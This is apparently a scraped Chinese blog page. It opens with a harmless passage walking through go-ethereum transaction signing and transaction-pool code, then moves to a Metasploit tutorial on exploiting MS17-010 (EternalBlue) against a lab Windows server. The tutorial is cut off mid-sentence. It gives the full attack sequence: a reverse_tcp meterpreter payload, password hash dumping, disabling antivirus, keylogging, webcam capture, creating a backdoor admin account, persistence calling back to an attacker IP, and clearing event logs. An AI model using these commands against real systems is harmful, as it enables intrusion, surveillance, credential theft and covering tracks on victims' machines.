uint64(*args.Gas), (*big.Int)(args.GasPrice), input)&#125; 2.2. 调用wallet.SignTx(account, tx, chainID)对当前交易进行签名。​ 对交易签名分为利用硬件钱包签名和keystore签名，在本地我们讲的是利用keystore进行签名。代码路径：go-ethereum\\accounts\\keystore\\keystore.go 主要步骤有： 根据钱包地址，查看当前钱包是否已解锁 如果已解锁的话，调用types.SignTx对交易进行签名 1234567891011121314func (ks *KeyStore) SignTx(a accounts.Account, tx *types.Transaction, chainID *big.Int) (*types.Transaction, error) &#123; // Look up the key to sign with and abort if it cannot be found ks.mu.RLock() defer ks.mu.RUnlock() unlockedKey, found := ks.unlocked[a.Address] if !found &#123; return nil, ErrLocked &#125; // Depending on the presence of the chain ID, sign with EIP155 or homestead if chainID != nil &#123; return types.SignTx(tx, types.NewEIP155Signer(chainID), unlockedKey.PrivateKey) &#125; return types.SignTx(tx, types.HomesteadSigner&#123;&#125;, unlockedKey.PrivateKey)&#125; 2.2.1 调用types.SignTx方法进行签名主要操作： ​ 将当前交易进行hash ​ 利用私钥对交易的hash值进行签名 ​ 调用tx.WithSignature(s, sig)方法，将交易的签名分别写到交易结构体里面 v,r,s字段 1234567func SignTx(tx *Transaction, s Signer, prv *ecdsa.PrivateKey) (*Transaction, error) &#123; h := s.Hash(tx) sig, err := crypto.Sign(h[:], prv) if err != nil &#123; return nil, err &#125; return tx.WithSignature(s, sig) 2.2.2 调用WithSignature为交易设置签名主要步骤： 调用签名笔的SignatureValues对象分别获取r,s,v字段 将r,s,v字段设置到transation中，并返回交易 12345678func (tx *Transaction) WithSignature(signer Signer, sig []byte) (*Transaction, error) &#123; r, s, v, err := signer.SignatureValues(tx, sig) if err != nil &#123; return nil, err &#125; cpy := &amp;Transaction&#123;data: tx.data&#125; cpy.data.R, cpy.data.S, cpy.data.V = r, s, v return cpy, nil 2.2.3 调用SignatureValues方法获取r,s,v字段主要操作： 获取交易签名的前32位赋值给r 获取交易签名的32-64位赋值给s 获取交易签名的最后一位赋值为v 返回r,s,v 123456789func (fs FrontierSigner) SignatureValues(tx *Transaction, sig []byte) (r, s, v *big.Int, err error) &#123; if len(sig) != 65 &#123; panic(fmt.Sprintf(&quot;wrong size for signature: got %d, want 65&quot;, len(sig))) &#125; r = new(big.Int).SetBytes(sig[:32]) s = new(big.Int).SetBytes(sig[32:64]) v = new(big.Int).SetBytes([]byte&#123;sig[64] + 27&#125;) return r, s, v, nil&#125; 2.3 调用submitTransaction提交交易主要步骤： 调用grpc SendTx发送交易到节点 如果交易的to字段为空的话，根据发送者的地址和交易的nonce值，生成合约地址 返回交易的hash值 1234567891011121314151617181920212223/**提交当前的交易parama:执行交易的上下文，交易的接口，交易return 交易的hash*/func submitTransaction(ctx context.Context, b Backend, tx *types.Transaction) (common.Hash, error) &#123; if err := b.SendTx(ctx, tx); err != nil &#123; //发送交易 return common.Hash&#123;&#125;, err &#125; if tx.To() == nil &#123; //如果TO==nil，则为合约账户 // signer := types.MakeSigner(b.ChainConfig(), b.CurrentBlock().Number()) from, err := types.Sender(signer, tx) if err != nil &#123; return common.Hash&#123;&#125;, err &#125; addr := crypto.CreateAddress(from, tx.Nonce()) //创建合约账号地址 log.Info(&quot;Submitted contract creation&quot;, &quot;fullhash&quot;, tx.Hash().Hex(), &quot;contract&quot;, addr.Hex()) &#125; else &#123; log.Info(&quot;Submitted transaction&quot;, &quot;fullhash&quot;, tx.Hash().Hex(), &quot;recipient&quot;, tx.To()) &#125; return tx.Hash(), nil&#125; 二. 节点接收交易以太坊的将新的交易添加到交易池时分两种情况： 本地交易：如果是本地交易的话，当添加到交易池之后，交易的发送地址存会被放在locals列表里面，这个账户的关联的交易将不会因为价格的限制或者其他的一些限制被删除 远程交易：远程发送来的交易为普通交易，交易可能会因为价格或者gas的限制等原因被从交易池里面的剔除 1. 执行add方法将交易添加到交易池中主要步骤： 检查当前交易是否在交易池里面已存在 调用validateTx方法验证当前交易，如果验证没有通过的话直接丢弃 查看当前交易池是否已满（5120），如果已经满了的话在交易池里面删除价格比较低的交易，如果当前交易的价格比较低的话直接拒绝接收 查看当前交易是否已经在正在处理的交易列表里面，如果在看能否替换旧的交易，并将新的交易添加到交易池中，同时将当前交易广播给其他节点 如果当前交易不能替换正在处理的交易列表（peeding）,则将交易放在待处理的交易列表中（queue) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778func (pool *TxPool) add(tx *types.Transaction, local bool) (bool, error) &#123; // If the transaction is already known, discard it hash := tx.Hash() if pool.all[hash] != nil &#123; log.Trace(&quot;Discarding already known transaction&quot;, &quot;hash&quot;, hash) return false, fmt.Errorf(&quot;known transaction: %x&quot;, hash) &#125; // If the transaction fails basic validation, discard it // 如果交易不能通过基本的验证,那么丢弃它 if err := pool.validateTx(tx, local); err != nil &#123; log.Trace(&quot;Discarding invalid transaction&quot;, &quot;hash&quot;, hash, &quot;err&quot;, err) invalidTxCounter.Inc(1) return false, err &#125; // If the transaction pool is full, discard underpriced transactions // 如果交易池满了. 那么删除一些低价的交易. if uint64(len(pool.all)) &gt;= pool.config.GlobalSlots+pool.config.GlobalQueue &#123; // If the new transaction is underpriced, don&#x27;t accept it // 如果新交易本身就是低价的，不接收 if !local &amp;&amp; pool.priced.Underpriced(tx, pool.locals) &#123; log.Trace(&quot;Discarding underpriced transaction&quot;, &quot;hash&quot;, hash, &quot;price&quot;, tx.GasPrice()) underpricedTxCounter.Inc(1) return false, ErrUnderpriced &#125; // New transaction is better than our worse ones, make room for it // 否则删除低价的池给他腾空间 drop := pool.priced.Discard(len(pool.all)-int(pool.config.GlobalSlots+pool.config.GlobalQueue-1), pool.locals) for _, tx := range drop &#123; log.Trace(&quot;Discarding freshly underpriced transaction&quot;, &quot;hash&quot;, tx.Hash(), &quot;price&quot;, tx.GasPrice()) underpricedTxCounter.Inc(1) pool.removeTx(tx.Hash(), false) &#125; &#125; // If the transaction is replacing an already pending one, do directly //验证交易签名 from, _ := types.Sender(pool.signer, tx) // already validated if list := pool.pending[from]; list != nil &amp;&amp; list.Overlaps(tx) &#123; // Nonce already pending, check if required price bump is met // 如果交易对应的Nonce已经在pending队列了,那么看是否能够替换. inserted, old := list.Add(tx, pool.config.PriceBump) if !inserted &#123; pendingDiscardCounter.Inc(1) return false, ErrReplaceUnderpriced &#125; // New transaction is better, replace old one if old != nil &#123; delete(pool.all, old.Hash()) pool.priced.Removed() pendingReplaceCounter.Inc(1) &#125; pool.all[tx.Hash()] = tx pool.priced.Put(tx) pool.journalTx(from, tx) log.Trace(&quot;Pooled new executable transaction&quot;, &quot;hash&quot;, hash, &quot;from&quot;, from, &quot;to&quot;, tx.To()) // We&#x27;ve directly injected a replacement transaction, notify subsystems //直接注入了一个替换事务，通知子系统 go pool.txFeed.Send(TxPreEvent&#123;tx&#125;) return old != nil, nil &#125; // New transaction isn&#x27;t replacing a pending one, push into queue // 新交易不能替换pending里面的任意一个交易,那么把他push到futuren 队列里面. replace, err := pool.enqueueTx(hash, tx) if err != nil &#123; return false, err &#125; // Mark local addresses and journal local transactions if local &#123; pool.locals.add(from) &#125; // 如果是本地的交易,会被记录进入journalTx pool.journalTx(from, tx) //存到硬盘 log.Trace(&quot;Pooled new future transaction&quot;, &quot;hash&quot;, hash, &quot;from&quot;, from, &quot;to&quot;, tx.To()) return replace, nil&#125; 2. 调用validateTx验证交易主要步骤如下： 检查交易的大小 检查交易签名 验证当前交易的gasprice是否小于交易池设置的gasPrice(本地交易不做此验证) 验证交易的Nonce 验证用户当前的余额是否足够 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// validateTx 使用一致性规则来检查一个交易是否有效,并采用本地节点的一些启发式的限制.func (pool *TxPool) validateTx(tx *types.Transaction, local bool) error &#123; // Heuristic limit, reject transactions over 32KB to prevent DOS attacks if tx.Size() &gt; 32*1024 &#123; return ErrOversizedData &#125; // Transactions can&#x27;t be negative. This may never happen using RLP decoded // transactions but may occur if you create a transaction using the RPC. if tx.Value().Sign() &lt; 0 &#123; return ErrNegativeValue &#125; // Ensure the transaction doesn&#x27;t exceed the current block limit gas. if pool.currentMaxGas &lt; tx.Gas() &#123; return ErrGasLimit &#125; // Make sure the transaction is signed properly // 确保交易被正确签名. from, err := types.Sender(pool.signer, tx) if err != nil &#123; return ErrInvalidSender &#125; // Drop non-local transactions under our own minimal accepted gas price // 如果不是本地的交易,并且GasPrice低于我们的设置,那么也不会接收. local = local || pool.locals.contains(from) // account may be local even if the transaction arrived from the network if !local &amp;&amp; pool.gasPrice.Cmp(tx.GasPrice()) &gt; 0 &#123; return ErrUnderpriced &#125; // Ensure the transaction adheres to nonce ordering // 确保交易遵守了Nonce的顺序,账户的nonce if pool.currentState.GetNonce(from) &gt; tx.Nonce() &#123; return ErrNonceTooLow &#125; // Transactor should have enough funds to cover the costs // cost == V + GP * GL // 确保用户有足够的余额来支付. if pool.currentState.GetBalance(from).Cmp(tx.Cost()) &lt; 0 &#123; return ErrInsufficientFunds &#125; intrGas, err := IntrinsicGas(tx.Data(), tx.To() == nil, pool.homestead) if err != nil &#123; return err &#125; // 如果交易是一个合约创建或者调用. 那么看看是否有足够的 初始Gas. if tx.Gas() &lt; intrGas &#123; return ErrIntrinsicGas &#125; return nil&#125; 3. 调用pool.enqueueTx(hash, tx)，将交易添加到待执行的交易队列中主要操作： 验证交易签名 调用queue的add方法替换该账户中比较老的未执行的交易 将当前交易添加到所有交易池中 12345678910111213141516171819202122232425// 将一个新的交易插入到future queuefunc (pool *TxPool) enqueueTx(hash common.Hash, tx *types.Transaction) (bool, error) &#123; // Try to insert the transaction into the future queue from, _ := types.Sender(pool.signer, tx) // already validated 验证签名 if pool.queue[from] == nil &#123; pool.queue[from] = newTxList(false) //如果pool.queue不存在当前地址 &#125; inserted, old := pool.queue[from].Add(tx, pool.config.PriceBump) if !inserted &#123; // An older transaction was better, discard this queuedDiscardCounter.Inc(1) return false, ErrReplaceUnderpriced &#125; // Discard any previous transaction and mark this if old != nil &#123; delete(pool.all, old.Hash()) pool.priced.Removed() queuedReplaceCounter.Inc(1) &#125; if pool.all[hash] == nil &#123; pool.all[hash] = tx pool.priced.Put(tx) &#125; return old != nil, nil&#125; 3.1 调用queue的add方法替换交易 如果新的交易比老的交易的GasPrice值要高出一定的比值priceBump，那么会替换老的交易。 Add 尝试插入一个新的交易，返回交易是否被接收，如果被接收，那么任意之前的交易会被替换。 如果新的交易被接收，那么总的cost和gas限制会被更新。 1234567891011121314151617181920212223func (l *txList) Add(tx *types.Transaction, priceBump uint64) (bool, *types.Transaction) &#123; // If there&#x27;s an older better transaction, abort // 如果存在老的交易。 而且新的交易的价格比老的高出一定的数量。那么替换。 old := l.txs.Get(tx.Nonce()) if old != nil &#123; threshold := new(big.Int).Div(new(big.Int).Mul(old.GasPrice(), big.NewInt(100+int64(priceBump))), big.NewInt(100)) // Have to ensure that the new gas price is higher than the old gas // price as well as checking the percentage threshold to ensure that // this is accurate for low (Wei-level) gas price replacements if old.GasPrice().Cmp(tx.GasPrice()) &gt;= 0 || threshold.Cmp(tx.GasPrice()) &gt; 0 &#123; return false, nil &#125; &#125; // Otherwise overwrite the old transaction with the current one l.txs.Put(tx) if cost := tx.Cost(); l.costcap.Cmp(cost) &lt; 0 &#123; l.costcap = cost &#125; if gas := tx.Gas(); l.gascap &lt; gas &#123; l.gascap = gas &#125; return true, old&#125; 4. 调用promoteExecutables方法将交易插入到pending执行队列中调用promoteExecutables把已经变得可以执行交易的从queue 列表插入到pending 列表流程如下： (1) 粉色部分主要是为了把queue中的交易“提”到pending中。在此过程中要做如下检查 ​ 丢弃nonce &lt; 账户当前nonce的交易，也就是已经被打包过的交易 ​ 丢弃转账金额 + gas消耗 &gt; 账户余额的交易，也就是会out-of-gas的交易 ​ 丢弃gas limit &gt; block gas limit的交易，这部分交易可能会导致区块生成失败 ​ 得到所有的可以执行的交易，并promoteTx加入pending并且广播交易 (2) 紫色部分主要是为了清理pending列表，使其满足GlobalSlots和AccountSlots的限制条件,需要从以下几个角度进行处理： ​ 如果有些账户的交易数超过了AccountSlots，则先按交易数最少的账户进行均衡。举例来说，如果有10个账户交易数超过了AccountSlots（默认16），其中交易数最少的账户包含20笔交易，那么先把其他9个账户的交易数量削减到20。 如果经过上面的步骤，pending的长度还是超过了GlobalSlots，那就严格按照AccountSlots进行均衡，也就是把上面的10个账户的交易数进一步削减到16 (3) 绿色部分主要是为了清理queue列表，使其满足GlobalQueue和AccountQueue的限制条件,需要从以下几个角度进行处理： ​ 如果每个账户的交易数超过了AccountQueue，丢弃多余交易 ​ 如果queue的长度超过了GlobalQueue，则把账户按最后一次心跳时间排序，然后依次去除账户中的交易，直到满足限制条件位置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175// 通过这个处理过程，所有的无效的交易(nonce太低，余额不足)会被删除。func (pool *TxPool) promoteExecutables(accounts []common.Address) &#123; // Gather all the accounts potentially needing updates // accounts存储了所有潜在需要更新的账户。 如果账户传入为nil，代表所有已知的账户。 if accounts == nil &#123; accounts = make([]common.Address, 0, len(pool.queue)) for addr := range pool.queue &#123; accounts = append(accounts, addr) &#125; &#125; // Iterate over all accounts and promote any executable transactions for _, addr := range accounts &#123; list := pool.queue[addr] if list == nil &#123; continue // Just in case someone calls with a non existing account &#125; // Drop all transactions that are deemed too old (low nonce) // 删除所有的nonce太低的交易 for _, tx := range list.Forward(pool.currentState.GetNonce(addr)) &#123; hash := tx.Hash() log.Trace(&quot;Removed old queued transaction&quot;, &quot;hash&quot;, hash) delete(pool.all, hash) pool.priced.Removed() &#125; // Drop all transactions that are too costly (low balance or out of gas) // 删除所有余额不足的交易。 drops, _ := list.Filter(pool.currentState.GetBalance(addr), pool.currentMaxGas) for _, tx := range drops &#123; hash := tx.Hash() log.Trace(&quot;Removed unpayable queued transaction&quot;, &quot;hash&quot;, hash) delete(pool.all, hash) pool.priced.Removed() queuedNofundsCounter.Inc(1) &#125; // Gather all executable transactions and promote them // 得到所有的可以执行的交易，并promoteTx加入pending for _, tx := range list.Ready(pool.pendingState.GetNonce(addr)) &#123; hash := tx.Hash() log.Trace(&quot;Promoting queued transaction&quot;, &quot;hash&quot;, hash) pool.promoteTx(addr, hash, tx) &#125; // Drop all transactions over the allowed limit // 删除所有超过限制的交易 if !pool.locals.contains(addr) &#123; for _, tx := range list.Cap(int(pool.config.AccountQueue)) &#123; hash := tx.Hash() delete(pool.all, hash) pool.priced.Removed() queuedRateLimitCounter.Inc(1) log.Trace(&quot;Removed cap-exceeding queued transaction&quot;, &quot;hash&quot;, hash) &#125; &#125; // Delete the entire queue entry if it became empty. if list.Empty() &#123; delete(pool.queue, addr) &#125; &#125; // If the pending limit is overflown, start equalizing allowances pending := uint64(0) for _, list := range pool.pending &#123; pending += uint64(list.Len()) &#125; // 如果pending的总数超过系统的配置。 if pending &gt; pool.config.GlobalSlots &#123; pendingBeforeCap := pending // Assemble a spam order to penalize large transactors first spammers := prque.New() for addr, list := range pool.pending &#123; // Only evict transactions from high rollers // 首先把所有大于AccountSlots最小值的账户记录下来， 会从这些账户里面剔除一些交易。 // 注意spammers是一个优先级队列，也就是说是按照交易的多少从大到小排序的。 if !pool.locals.contains(addr) &amp;&amp; uint64(list.Len()) &gt; pool.config.AccountSlots &#123; spammers.Push(addr, float32(list.Len())) &#125; &#125; // Gradually drop transactions from offenders offenders := []common.Address&#123;&#125; for pending &gt; pool.config.GlobalSlots &amp;&amp; !spammers.Empty() &#123; // Retrieve the next offender if not local address offender, _ := spammers.Pop() offenders = append(offenders, offender.(common.Address)) // Equalize balances until all the same or below threshold if len(offenders) &gt; 1 &#123; // 第一次进入这个循环的时候， offenders队列里面有交易数量最大的两个账户 // Calculate the equalization threshold for all current offenders // 把最后加入的账户的交易数量当成本次的阈值t threshold := pool.pending[offender.(common.Address)].Len() // Iteratively reduce all offenders until below limit or threshold reached // 遍历直到pending有效，或者是倒数第二个的交易数量等于最后一个的交易数量 for pending &gt; pool.config.GlobalSlots &amp;&amp; pool.pending[offenders[len(offenders)-2]].Len() &gt; threshold &#123; // 遍历除了最后一个账户以外的所有账户， 把他们的交易数量减去1. for i := 0; i &lt; len(offenders)-1; i++ &#123; list := pool.pending[offenders[i]] for _, tx := range list.Cap(list.Len() - 1) &#123; // Drop the transaction from the global pools too hash := tx.Hash() delete(pool.all, hash) pool.priced.Removed() // Update the account nonce to the dropped transaction if nonce := tx.Nonce(); pool.pendingState.GetNonce(offenders[i]) &gt; nonce &#123; pool.pendingState.SetNonce(offenders[i], nonce) &#125; log.Trace(&quot;Removed fairness-exceeding pending transaction&quot;, &quot;hash&quot;, hash) &#125; pending-- &#125; &#125; &#125; &#125; // If still above threshold, reduce to limit or min allowance if pending &gt; pool.config.GlobalSlots &amp;&amp; len(offenders) &gt; 0 &#123; for pending &gt; pool.config.GlobalSlots &amp;&amp; uint64(pool.pending[offenders[len(offenders)-1]].Len()) &gt; pool.config.AccountSlots &#123; for _, addr := range offenders &#123; list := pool.pending[addr] for _, tx := range list.Cap(list.Len() - 1) &#123; // Drop the transaction from the global pools too hash := tx.Hash() delete(pool.all, hash) pool.priced.Removed() // Update the account nonce to the dropped transaction if nonce := tx.Nonce(); pool.pendingState.GetNonce(addr) &gt; nonce &#123; pool.pendingState.SetNonce(addr, nonce) &#125; log.Trace(&quot;Removed fairness-exceeding pending transaction&quot;, &quot;hash&quot;, hash) &#125; pending-- &#125; &#125; &#125; pendingRateLimitCounter.Inc(int64(pendingBeforeCap - pending)) &#125; // If we&#x27;ve queued more transactions than the hard limit, drop oldest ones queued := uint64(0) for _, list := range pool.queue &#123; queued += uint64(list.Len()) &#125; if queued &gt; pool.config.GlobalQueue &#123; // Sort all accounts with queued transactions by heartbeat addresses := make(addresssByHeartbeat, 0, len(pool.queue)) for addr := range pool.queue &#123; if !pool.locals.contains(addr) &#123; // don&#x27;t drop locals addresses = append(addresses, addressByHeartbeat&#123;addr, pool.beats[addr]&#125;) &#125; &#125; sort.Sort(addresses) // Drop transactions until the total is below the limit or only locals remain for drop := queued - pool.config.GlobalQueue; drop &gt; 0 &amp;&amp; len(addresses) &gt; 0; &#123; addr := addresses[len(addresses)-1] list := pool.queue[addr.address] addresses = addresses[:len(addresses)-1] // Drop all transactions if they are less than the overflow if size := uint64(list.Len()); size &lt;= drop &#123; for _, tx := range list.Flatten() &#123; pool.removeTx(tx.Hash(), true) &#125; drop -= size queuedRateLimitCounter.Inc(int64(size)) continue &#125; // Otherwise drop only last few transactions txs := list.Flatten() for i := len(txs) - 1; i &gt;= 0 &amp;&amp; drop &gt; 0; i-- &#123; pool.removeTx(txs[i].Hash(), true) drop-- queuedRateLimitCounter.Inc(1) &#125; &#125; &#125;&#125; 4.1 调用promoteTx将交易广播到其他节点主要步骤如下： 获取正在执行队列中该地址的所有交易 用当前交易替换已存在的比较老的交易 如果交易池中不存在当前交易，将该交易添加到all队列中 设置更新交易的nonce 最后调用grpc接口，将交易广播到其他节点 12345678910111213141516171819202122232425262728293031func (pool *TxPool) promoteTx(addr common.Address, hash common.Hash, tx *types.Transaction) &#123; // Try to insert the transaction into the pending queue if pool.pending[addr] == nil &#123; pool.pending[addr] = newTxList(true) &#125; list := pool.pending[addr] inserted, old := list.Add(tx, pool.config.PriceBump) if !inserted &#123; // An older transaction was better, discard this delete(pool.all, hash) pool.priced.Removed() pendingDiscardCounter.Inc(1) return &#125; // Otherwise discard any previous transaction and mark this if old != nil &#123; delete(pool.all, old.Hash()) pool.priced.Removed() pendingReplaceCounter.Inc(1) &#125; // Failsafe to work around direct pending inserts (tests) if pool.all[hash] == nil &#123; pool.all[hash] = tx pool.priced.Put(tx) &#125; // Set the potentially new pending nonce and notify any subsystems of the new tx pool.beats[addr] = time.Now() pool.pendingState.SetNonce(addr, tx.Nonce()+1) go pool.txFeed.Send(TxPreEvent&#123;tx&#125;)","categories":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/"},{"name":"EVM","slug":"BlockChain/EVM","permalink":"http://www.zzugo.ayxyj.cn/categories/BlockChain/EVM/"}],"tags":[{"name":"BlockChain","slug":"BlockChain","permalink":"http://www.zzugo.ayxyj.cn/tags/BlockChain/"},{"name":"EVM","slug":"EVM","permalink":"http://www.zzugo.ayxyj.cn/tags/EVM/"}]},{"title":"永恒之蓝 - 勒索病毒","slug":"WannaCry","date":"2020-11-27T03:49:25.000Z","updated":"2020-11-29T11:02:07.000Z","comments":true,"path":"2020/11/27/WannaCry/","link":"","permalink":"http://www.zzugo.ayxyj.cn/2020/11/27/WannaCry/","excerpt":"","text":"目录 Metasploit 使用方法 ms17-010漏洞复现 1. 主机发现 2. 进入MSF框架 3. 使用ms17-010扫描模块，对靶机进行扫描 4. 使用ms17-010攻击模块，对靶机进行攻击 后渗透阶段 Post后渗透模块 查看目标主机是否运行在虚拟机上 关闭杀毒软件 访问文件系统 下载/上传文件 权限提升 获取用户密码 运行程序 屏幕截图 创建新账号 启用远程桌面 键盘记录 进程迁移 禁止目标主机使用键盘鼠标 用目标主机摄像头拍照 使用扩展库 生成持续性后门 清除事件日志 MetasploitMetasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程，被安全社区冠以“可以黑掉整个宇宙”之名。刚开始的Metasploit是采用Perl语言编写的，但是再后来的新版中，改成了用Ruby语言编写的了。在kali中，自带了Metasploit工具。 MSF的更新：apt update ​ apt install metasploit-framework 使用方法 ​ 进入框架：msfconsole ​ 使用search命令查找相关漏洞： search ms17-010 ​ 使用use进入模块: use exploit/windows/smb/ms17_010_eternalblue ​ 使用info查看模块信息： info ​ 设置攻击载荷：set payload windows/x64/meterpreter/reverse_tcp ​ 查看模块需要配置的参数：show options ​ 设置参数：set RHOST 192.168.125.138 ​ 攻击：exploit / run ​ 后渗透阶段 不同的攻击用到的步骤也不一样，接下来我们用永恒之蓝ms17-010来熟悉一下MSF工具的使用 ms17-010漏洞复现描述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 影响版本 目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0 复现环境 攻击机： kali 靶机：win server 2008 r2 (192.168.1.8) 复现过程 1. 主机发现nmap进行ip端口扫描 扫描到开放了445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞 2. 进入MSF框架12msfconsolesearch ms17-010 这里可以得到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞 exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。 3. 使用ms17-010扫描模块，对靶机进行扫描使用模块 ​ 该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。 ​ msf&gt; use auxiliary/scanner/smb/smb_ms17_010 查看模块需要配置的参数 ​ show option ​ 右边Required为yes的选项说明左边 Current Setting 这个项对应的需要填写，比如Rhoststs 设置攻击目标 ​ RHOSTS 参数是要探测主机的ip或ip范围（比如 192.168.125.125-129.168.125.140 或者 192.168.1.0/24） ​ set rhosts 192.168.1.8 再次查看配置参数 ​ show options 执行扫描 ​ run ​ ​ 显示主机很可能能够会受到永恒之蓝漏洞的攻击 4. 使用ms17-010攻击模块，对靶机进行攻击 use exploit/windows/smb/ms17_010_eternalblue 查看这个漏洞的信息 ​ info 查看可攻击的系统平台，这个命令显示该攻击模块针对哪些特定操作系统版本、语言版本的系统 ​ show targets ​ ​ 这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如MS08_067，这样就要我们指定目标系统的版本的。如果不设置的话，MSF会自动帮我们判断目标操作系统的版本和语言(利用目标系统的指纹特征) 查看攻击载荷 ​ 攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令 show payloads ​ 该命令可以查看当前漏洞利用模块下可用的所有Payload 设置攻击载荷 ​ set payload windows/x64/meterpreter/reverse_tcp 查看配置参数 ​ show options 设置目标攻击ip ​ set rhosts 192.168.1.8 (如果有多个攻击目标ip间直接用空格隔开就行) 设置用于接收从目标机弹回来的shell ​ set LHOST 192.168.1.11 执行攻击 ​ exploit（run） 后渗透阶段运行了exploit命令之后，我们开启了一个reverse TCP监听器来监听本地的 4444 端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 meterpreter &gt; 出现，我们输入： shell 即可切换到目标主机的windows shell，要想从目标主机shell退出到 meterpreter ，我们只需输入：exit 要想从 meterpreter 退出到MSF框架，输入：background 输入 sessions -l 查看我们获得的shell 输入 sessions -i 1 即可切换到id为1的shell ​ Post后渗透模块 在meterpreter &gt; 中我们可以使用以下的命令来实现对目标的操作 12345678910111213141516171819202122232425262728293031323334353637​```sysinfo #查看目标主机系统信息run scraper #查看目标主机详细信息run hashdump #导出密码的哈希load kiwi #加载ps #查看目标主机进程信息pwd #查看目标当前目录(windows)getlwd #查看目标当前目录(Linux)search -f *.jsp -d e:\\ #搜索E盘中所有以.jsp为后缀的文件download e:\\test.txt /root #将目标机的e:\\test.txt文件下载到/root目录下upload /root/test.txt d:\\test #将/root/test.txt上传到目标机的 d:\\test\\ 目录下getpid #查看当前Meterpreter Shell的进程PIDmigrate 1384 #将当前Meterpreter Shell的进程迁移到PID为1384的进程上idletime #查看主机运行时间getuid #查看获取的当前权限getsystem #提权run killav #关闭杀毒软件screenshot #截图webcam_list #查看目标主机的摄像头webcam_snap #拍照webcam_stream #开视频execute 参数 -f 可执行文件 #执行可执行程序run getgui -u hack -p 123 #创建hack用户，密码为123run getgui -e #开启远程桌面keyscan_start #开启键盘记录功能keyscan_dump #显示捕捉到的键盘记录信息keyscan_stop #停止键盘记录功能uictl disable keyboard #禁止目标使用键盘uictl enable keyboard #允许目标使用键盘uictl disable mouse #禁止目标使用鼠标uictl enable mouse #允许目标使用鼠标load #使用扩展库run #使用扩展库run persistence -X -i 5 -p 8888 -r 192.168.10.27 #反弹时间间隔是5s 会自动连接 192.168.27的4444端口，缺点是容易被杀毒软件查杀portfwd add -l 3389 -r 192.168.11.13 -p 3389 #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址clearev #清除日志 下面的模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。 123456789run post/windows/manage/migrate #自动进程迁移 run post/windows/gather/checkvm #查看目标主机是否运行在虚拟机上 run post/windows/manage/killav #关闭杀毒软件 run post/windows/manage/enable_rdp #开启远程桌面服务 run post/windows/manage/autoroute #查看路由信息 run post/windows/gather/enum_logged_on_users #列举当前登录的用户 run post/windows/gather/enum_applications #列举应用程序 run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码 run windows/gather/smart_hashdump #dump出所有用户的hash 查看目标主机是否运行在虚拟机上 关闭杀毒软件拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令： ​ run killav 访问文件系统Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似，这里就不演示了） 下载/上传文件download file 从目标主机下载文件 upload file 上传文件到目标主机 ​ 这里下载的文件的路径默认在家目录下 权限提升有的时候，你可能会发现自己的 Meterpreter 会话受到了用户权限的限制，而这将会严重影响你在目标系统中的活动。比如说，修改注册表、安装后门或导出密码等活动都需要提升用户权限，而Meterpreter给我们提供了一个 getsystem 命令，它可以使用多种技术在目标系统中实现提权 getuid 获取当前用户的信息 可以看到，当我们使用 getsystem进行提权后，用户身材为 NT AUTHORITY\\SYSTEM ，这个也就是Windows的系统权限 获取用户密码执行 ：run hashdump hashdump 模块可以从SAM数据库中导出本地用户账号, 该命令的使用需要系统权限 从上图可知，导出了三个用户名及密码，输出格式为，用户名：SID：LM哈希：NTLM哈希::: 我们来破解用户名为chenchen的用户密码，可以复制 NTLM哈希去在线网站如 www.cmd5.com 破解 运行程序查看目标主机安装了哪些应用 run post/windows/gather/enum_applications 可以使用 execute 命令在目标系统中执行程序。使用方法如下： 1execute 参数 -f 可执行文件 可选参数： -f：指定可执行文件 -H：创建一个隐藏进程 -a：传递给命令的参数 -i： 跟进程进行交互 -m：从内存中执行 -t： 使用当前伪造的线程令牌运行进程 -s： 在给定会话中执行进程 如果我想执行它某个应用程序的话，该怎么实现？？ 屏幕截图输入 ： screenshot 即可对目标主机的当前使用屏幕进去屏幕截取 创建新账号查看目标主机有哪些账户 run post/windows/gather/enum_logged_on_users 接着，我们在目标机中创建一个新的账号 ： run getgui -u hack -p 123 ，这个命令会创建用户，并把他添加到 Administrators 组中，这样该用户就拥有远程桌面的权限了。 这里成功创建了用户，但是添加到Administrators组中失败了 ？？why 如果添加到Administrators组中失败了的话，我们可以运行：shell ，进行cmd窗口手动将该用户添加到administrators组中。 启用程桌面当我们新添加的用户已经拥有远程桌面之后，我们就可以使用这个账号凭证来开启远程桌面会话了。 我们可以通过运行getuid脚本帮我们开启目标主机的远程桌面，可以使用-e参数确保目标设备开启了远程桌面功能（重启之后同样会自动开启），我们输入： run getgui -e 或者 